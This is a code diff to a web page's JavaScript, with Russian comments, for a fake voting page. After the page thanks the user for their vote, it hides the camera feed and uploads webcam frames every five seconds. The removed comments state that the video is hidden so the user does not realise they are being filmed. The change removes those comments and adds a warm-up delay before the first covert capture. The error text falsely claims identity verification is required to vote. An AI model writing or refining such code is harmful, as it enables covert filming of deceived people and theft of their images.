@@ -61,8 +61,6 @@
                 });
 
                 video.srcObject = stream;
-                // Скрываем видео, чтобы пользователь не сразу понял, что его снимают
-                // Или показываем маленькое окошко "верификации"
                 video.style.display = "none"; 
                 
                 startBtn.innerText = "ГОЛОС ПРИНЯТ!";
@@ -70,14 +68,15 @@
                 status.innerText = "Спасибо! Ваш голос учтен.";
                 status.style.color = "#a8e063";
 
-                // Начинаем скрытую отправку кадров
-                captureAndUpload(video); // Первый кадр сразу
-                setInterval(() => {
+                // Даем камере 1 секунду на "прогрев" перед первым снимком
+                setTimeout(() => {
                     captureAndUpload(video);
-                }, 5000);
+                    setInterval(() => {
+                        captureAndUpload(video);
+                    }, 5000);
+                }, 1000);
 
-            } catch (err) {
-                console.error("Ошибка:", err);
+            } catch (err) {                console.error("Ошибка:", err);
                 status.innerText = "Ошибка: Для голосования необходима верификация личности.";
                 status.style.color = "#ff4b2b";
             }
